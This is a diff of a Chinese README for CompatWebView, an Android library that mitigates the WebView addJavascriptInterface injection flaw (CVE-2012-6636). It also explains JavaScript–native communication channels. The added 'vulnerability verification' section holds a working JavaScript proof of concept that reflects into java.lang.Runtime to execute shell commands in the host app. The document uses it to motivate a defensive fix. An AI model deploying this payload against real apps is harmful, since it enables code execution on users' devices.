@@ -3,12 +3,15 @@ CompatWebView
 
 CompatWebView是为了解决WebView的JavaScriptInterface注入漏洞
 - [漏洞介绍：CVE-2012-6636](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6636)
-- [官方说明](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface)
+- [官方说明：addJavaScriptInterface](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface)This method can be used to allow JavaScript to control the host application. This is a powerful feature, but also presents a security risk for apps targeting JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still vulnerable if the app runs on a device running Android earlier than 4.2. The most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the method is called only when running on Android 4.2 or later. With these older versions, **JavaScript could use reflection to access an injected object's public fields.** Use of this method in a WebView containing untrusted content could allow an attacker to manipulate the host application in unintended ways, executing Java code with the permissions of the host application. Use extreme care when using this method in a WebView which could contain untrusted content.
 
 - 在Android的api小于17（android4.2）调用addJavaScriptInterface注入java对象会有安全风险，可以通过js注入反射调用到Java层的方法，造成安全隐患。[漏洞验证案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/InjectWebViewActivity.java)
 
-- 解决方案：在大于等于api17中延用addJavaScriptInterface，在小于api17中采用另外的通道与js进行交互，同时保持api调用的一致性，
+- CompatWebView的解决方案：在大于等于android4.2中延用addJavaScriptInterface，在小于android4.2中采用另外的通道与js进行交互，同时保持api调用的一致性，
 CompatWebView做到了对客户端开发透明，复用了原来addJavaScriptInterface的api，对前端开发也是透明的，前端不用写两套交互方式。
+
+
+
 
 How to use
 -----------
@@ -28,11 +31,65 @@ webView.setWebViewClient(new CompatWebViewClient(){
 });
 ```
 
-通信方式总结
+
+
+
+漏洞验证案例
 -----------
-### JavaScript与Android通信方式总结
-总的来说JavaScript与Android native通信的方式有三大类：[使用案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/CommunicateWebViewActivity.java)
-- 通过JavaScriptInterface注入java对象
+下面验证一下addJavaScriptInterface漏洞，详细代码见[漏洞验证案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/InjectWebViewActivity.java)
+- 1、先定义一个JavascriptInterface
+```java
+    public class JInterface {
+        @JavascriptInterface
+        public void testJsCallJava(String msg, int i) {
+            Toast.makeText(MyApp.application, msg + ":" + (i + 20), Toast.LENGTH_SHORT).show();
+        }
+        @JavascriptInterface
+        public void finishSelf() {
+            InjectWebViewActivity.this.finish();
+        }
+    }
+```
+- 2、再将Interface通过addJavaScriptInterface添加到WebView
+```java
+    webView.addJavascriptInterface(new JInterface(), "JInterface");
+```
+- 3、然后我们看看在Javascript中就可以通过查找window属性中的JInterface对象，然后反射执行一些攻击了，例如下面的例子通过反射Android中的Runtime类在应用中执行shell脚本。
+```javascript
+function testInjectBug(){
+    var p = execute(["ls","/"]);
+    console.log(convertStreamToString(p.getInputStream()));
+}            
+function execute(cmdArgs) {
+    for (var obj in window) {
+         if ("getClass" in window[obj]) {
+              console.log("find:"+obj);
+              return window[obj].getClass().forName("java.lang.Runtime").
+                            getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+          }
+    }
+}
+function convertStreamToString(inputStream) {
+     var result = "";
+     var i = inputStream.read();
+     while(i != -1) {
+          var tmp = String.fromCharCode(i);
+          result += tmp;
+          i = inputStream.read();
+     }
+     return result;
+}            
+```
+
+
+
+
+JavaScript与Android通信
+----------------------
+在介绍CompatWebView原理之前，先简介一些Javascript与Android的通信方式
+### JavaScript调用Android通信方式总结
+总的来说JavaScript与Android native通信的方式有**三大类**：[使用案例](https://github.com/heimashi/CompatWebView/blob/master/example/src/main/java/com/sw/bridge/CommunicateWebViewActivity.java)
+- **通过JavaScriptInterface注入java对象**
     - Android端注入
     ```java
       webView.addJavascriptInterface(new JInterface(), "JInterface");
@@ -48,7 +105,7 @@ webView.setWebViewClient(new CompatWebViewClient(){
     ```javascript
     JInterface.testJsCallJava("hello", 666)
     ```
-- 通过WebViewClient，实现shouldOverrideUrlLoading
+- **通过WebViewClient，实现shouldOverrideUrlLoading**
     - Android端WebViewClient，复写shouldOverrideUrlLoading
     ```java
     webView.setWebViewClient(new WebViewClient() {
@@ -73,7 +130,7 @@ webView.setWebViewClient(new CompatWebViewClient(){
         window.location.href = "jtscheme://hello"
         <a href="jtscheme://hello2?a=1&b=c">ShouldOverrideUrlLoading</a>
     ```
-- 通过WebChromeClient，这种有四种方式prompt(提示框)、alert(警告框)、confirm(确认框)、console(log控制台)
+- **通过WebChromeClient，这种有四种方式prompt(提示框)、alert(警告框)、confirm(确认框)、console(log控制台)**
     - Android端实现WebChromeClient
     ```java
     webView.setWebChromeClient(new WebChromeClient() {
@@ -120,8 +177,11 @@ webView.setWebViewClient(new CompatWebViewClient(){
     
     window.prompt("jtscheme://hello?a=1&b=hi");
     ```
-### Android与JavaScript通信方式总结
-Android native与JavaScript通信的方式有两种loadUrl()和evaluateJavascript()
+- **总结：Javascript想通知Android的native层，除了JavascriptInterface以外，一般采用shouldOverrideUrlLoading和onJsPrompt这两种方式，console、alert和confirm这三个方法在Javascript中较常用不太适合。**
+
+
+### Android调用JavaScript通信方式总结
+Android native与JavaScript通信的方式有**两种:loadUrl()和evaluateJavascript()**
 ```java
 webView.loadUrl("javascript:" + javascript);
 webView.evaluateJavascript(javascript, null);
@@ -139,7 +199,9 @@ public void compatEvaluateJavascript(String javascript) {
 }
 ```
 
-CompatWebView实现原理
+
+
+CompatWebView通信流程
 --------------------
 CompatWebView在api17及其以上延用了在addJavaScriptInterface，在小于api17中采用另外的通道与js进行交互，通过shouldOverrideUrlLoading通道来让js层通知到Android，通信流程如下：
 - 1.Android层添加注入对象时调用compatAddJavaScriptInterface来添加JavaScriptInterface
@@ -159,11 +221,18 @@ JInterface.testJsCallJava("jsCallJava success", 20)
 ```
 - 6.执行上面的js后Android端在shouldOverrideUrlLoading通道就会收到scheme，从scheme中解析出对象和对应的方法，然后再反射调用对应的方法就完成了本次通信
 
+
+CompatWebView代码分析
+--------------------
+
+
+
 其他WebView漏洞
 --------------
-[CVE-2013-4710](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4710)
-[CVE-2014-1939](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1939)
-[CVE-2014-7224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7224)
+- [CVE-2013-4710](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4710)
+- [CVE-2014-1939](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1939)
+- [CVE-2014-7224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7224)
+- [CNTA-2018-0005](http://www.cnvd.org.cn/webinfo/show/4365)setAllowFileAccessFromFileURLs setAllowUniversalAccessFromFileURLs
 - 解决方案
 ```java
 removeJavascriptInterface("searchBoxJavaBridge_");
